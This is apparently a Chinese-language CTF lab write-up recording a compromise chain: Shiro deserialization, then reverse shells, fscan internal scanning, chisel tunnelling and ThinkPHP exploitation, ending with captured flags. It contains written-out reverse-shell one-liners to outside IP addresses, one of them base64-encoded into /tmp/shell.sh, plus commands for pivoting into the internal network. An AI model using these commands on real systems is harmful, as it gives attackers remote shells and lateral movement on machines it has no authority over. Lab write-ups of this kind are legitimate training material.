Shiro flag01

一个登陆页面，而且还有remember me字段，猜测是shiro反序列化，使用Shiro反序列化利用工具直接打

可以执行命令了cat /flag.txt

WSS-Studio{Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c}

##Thinkphp flag02

先反弹shell吧

反弹shell命令base64编码一下

bash -i >& /dev/tcp/8.133.198.27/1122 0>&1*

然后下载一下fscan扫描内网

扫描之后发现192.168.100.2/24这个网段有两台机器有问题：

192.168.100.2 shiro反序列化 已经拿下

192.168.100.3 thinkphp 未拿下

这个机器是在内网，所以我们需要搭建代理隧道

###搭建代理

使用chisel端口转发，先下载chisel

使用反向连接

shiro机器上执行 ./chisel* client 192.168.69.44:2003 R:0.0.0.0:10001:192.168.100.3:80

win11: chisel.exe server -p 2003 --reverse

使用thinkphp扫描工具

拿flag

WSS-Studio{ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10}

发送DNS请求，发现该机器可以出网，那么就可以反弹shell

反弹thinkphp shell

bash -i >& /dev/tcp/192.168.226.128/1234 0>&1

echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIyNi4xMjgvMTIzNCAwPiYx | base64 -d > /tmp/shell.sh
